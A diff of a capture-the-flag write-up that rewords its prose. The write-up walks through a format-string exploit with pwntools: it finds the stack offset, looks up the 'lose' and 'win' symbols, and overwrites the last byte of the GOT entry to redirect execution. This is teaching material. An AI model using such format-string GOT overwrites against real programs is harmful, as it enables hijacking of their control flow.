@@ -181,10 +181,10 @@ the address for `lose` and `win` are in our library file, and overwrite the
 
 ## Lets start pwning
 
-First lets figure out where our input is going going on the stack, so know what
+First we will find where our input is going on the stack, so we know which
 argument will contain the address of the `lose` entry we want to pass to `%n`
 in our print statement. We can do this by printing a bunch of `A`s followed by
-some flags and trying to find which argument our `A`s are:
+some flags and try to find which argument our `A`s are:
 
 ```python
 from pwn import *
@@ -199,7 +199,7 @@ p.sendline(payload)
 print(p.recv())
 ```
 
-We get the following string printed:
+This prints the following string:
 
 ```
 1:64 2:f7f33580 3:804866f 4:0 5:ca0000 6:1 7:41414141 8:41414141 9:31204141 10:2078253a
@@ -222,9 +222,9 @@ print(hex(lib.symbols['win']))   # 0x1189
 It looks we'll just have to overwrite the last part of `lose`'s address to be
 `89` instead of `f9`.
 
-Lets try and do this now, first we need to get the address of `GOT` entry of
+To do this, we first need to get the address of the `GOT` entry of
 `lose`, then we need to overwrite the last byte of `lose` to be `89` instead of
-`f9`.
+`f9`:
 
 ```python
 from pwn import *
@@ -248,7 +248,7 @@ p.sendline(payload)
 print(p.recv())
 ```
 
-We get:
+Output:
 
 ```
 Out[1]: b'Simulating loss...\n\nNo flag for you!\nHey you! GOT milk? Your answer: \x10\x
